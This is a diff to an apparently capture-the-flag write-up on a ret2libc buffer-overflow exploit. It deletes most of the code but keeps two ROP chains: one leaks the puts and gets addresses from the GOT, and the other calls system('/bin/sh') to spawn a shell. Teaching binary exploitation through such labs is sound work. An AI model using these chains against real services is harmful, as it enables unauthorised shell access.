@@ -139,32 +139,9 @@ main = p64(0x004011ae) # The address of main function shown in Ghidra
 
 ### 1st ropchain:
 ```python
-main = p64(0x004011ae)
-string = b"QUIT"
-
-puts_plt = p64(elf.plt['puts'])
-puts_got = p64(elf.got['puts'])
-gets_got = p64(elf.got['gets'])
-pop_rdi = p64(0x00000000004012cb)
-
 ropchain1 = b'A' * 0x84 + string
 ropchain1 += pop_rdi + puts_got + puts_plt
 ropchain1 += pop_rdi + gets_got + puts_plt + main
-
-run.sendline(ropchain1)
-
-run.recvuntil(b"\n")
-leaked_puts = u64(run.recvline().strip().ljust(8, b'\x00'))
-leaked_gets = u64(run.recvline().strip().ljust(8, b'\x00'))
-
-log.info("Leaked puts address = " + hex(leaked_puts))
-log.info("Leaked gets address = " + hex(leaked_gets))
-```
-
-### Result:
-```bash
-[*] Leaked puts address = 0x7f48fd04f210
-[*] Leaked gets address = 0x7f48fd04e780
 ```
 
 ## Building the 2nd ropchain (to spawn shell)
@@ -188,15 +165,7 @@ system = libc.sym['system']
 
 ### 2nd ropchain:
 ```python
-bin_sh = next(libc.search(b"/bin/sh"))
-system = libc.sym['system']
-
-log.info("/bin/sh = " + hex(binsh))
-log.info("system = " + hex(system))
-
 ropchain2 = b'A' * 0x84 + string + pop_rdi + p64(bin_sh) + p64(system)
-
-run.sendline(ropchain2)
 ```
 
 ## Full exploit script
